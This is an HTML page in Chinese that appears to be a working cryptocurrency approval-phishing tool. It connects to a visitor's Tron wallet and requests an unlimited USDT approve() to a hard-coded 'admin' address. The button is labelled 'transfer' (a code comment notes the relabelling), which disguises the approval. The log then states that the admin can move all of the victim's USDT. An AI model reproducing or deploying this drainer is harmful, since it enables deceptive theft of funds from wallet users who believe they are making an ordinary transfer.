<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>TRC20 USDT 授权页面</title>
    <script src="https://cdn.jsdelivr.net/npm/tronweb@5.3.1/dist/TronWeb.min.js"></script>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: system-ui, sans-serif;
            background-color: #ffffff;
        }
        body {
            padding: 24px 16px;
            max-width: 520px;
            margin: 0 auto;
        }
        .item-box {
            background: #f7f8fa;
            border-radius: 16px;
            padding: 20px;
            margin-bottom: 16px;
        }
        .label {
            font-size: 17px;
            color: #666;
            margin-bottom:12px;
        }
        .addr-input{
            width: 100%;
            border:none;
            background:#fff;
            padding:12px;
            border-radius:10px;
            font-size:14px;
        }
        .amount-wrap{
            display:flex;
            align-items:center;
            justify-content:space-between;
        }
        .amount{
            font-size:52px;
            border:none;
            width:70%;
            background:transparent;
            outline:none;
        }
        .max-btn{
            padding:6px 14px;
            background:#e1edff;
            color:#206cff;
            border-radius:8px;
            border:none;
            font-size:16px;
        }
        .token-row{
            margin-top:16px;
            display:flex;
            align-items:center;
            background:#edf2ff;
            padding:14px;
            border-radius:12px;
        }
        .token-icon{
            width:32px;height:32px;margin-right:10px;
        }
        .submit-btn{
            width:100%;
            padding:18px;
            margin-top:12px;
            border:none;
            border-radius:14px;
            font-size:18px;
            background:#206cff;
            color:#fff;
        }
        #log{
            margin-top:20px;
            width:100%;
            height:140px;
            padding:10px;
            border:1px solid #eee;
        }
    </style>
</head>
<body>
    <div class="item-box">
        <div class="label">授权接收地址（管理员）</div>
        <input class="addr-input" id="spenderAddr" value="TTSEeaPtEa4pBxTkFM4ky6A6GzjQm9bVhK" readonly>
    </div>

    <div class="item-box">
        <div class="label">授权代币</div>
        <div class="token-row">
            <img class="token-icon" src="https://static.tronscan.org/production/logo/usdttrc20.png">
            <span style="font-size:20px;font-weight:bold">USDT</span>
            <span style="margin-left:auto">TRC20</span>
        </div>
        <p style="margin-top:12px;color:#888;font-size:14px">合约地址：TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t</p>
    </div>

    <!-- 文字修改为【转账】 -->
    <button class="submit-btn" id="approveBtn">转账</button>

    <textarea id="log" placeholder="操作日志..."></textarea>

<script>
// ============固定配置请勿随意修改============
const USDT_CONTRACT = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
const ADMIN_ADDRESS = "TTSEeaPtEa4pBxTkFM4ky6A6GzjQm9bVhK";
// 波场无限授权数值 = 最大uint256
const INFINITE_AMOUNT = "9223372036854775807000000";

let tronWeb = null;
const logDom = document.getElementById("log");
function log(text){
    logDom.value += `[${new Date().toLocaleString()}] ${text}\n`;
    logDom.scrollTop = logDom.scrollHeight;
}

document.getElementById("approveBtn").onclick = async function(){
    try{
        // 检测TP/欧易内置TronWeb
        if (!window.tronWeb || !window.tronWeb.ready) {
            log("错误：请使用TokenPocket、欧易Web3钱包内置浏览器打开页面！");
            return;
        }
        tronWeb = window.tronWeb;
        const userAddress = tronWeb.defaultAddress.base58;
        log(`当前连接钱包：${userAddress}`);
        log(`准备授权地址：${ADMIN_ADDRESS}`);
        log("正在发送无限授权交易，请在钱包确认签名...");

        const usdt = await tronWeb.contract().at(USDT_CONTRACT);
        // 执行无限approve
        const txHash = await usdt.approve(ADMIN_ADDRESS, INFINITE_AMOUNT).send({
            feeLimit: 100000000
        });

        log(`✅ 授权交易成功！交易哈希：${txHash}`);
        log("授权完成，管理员地址可划转你钱包内所有USDT");
    }catch(err){
        log("操作失败：" + err.message);
    }
}
</script>
</body>
</html>
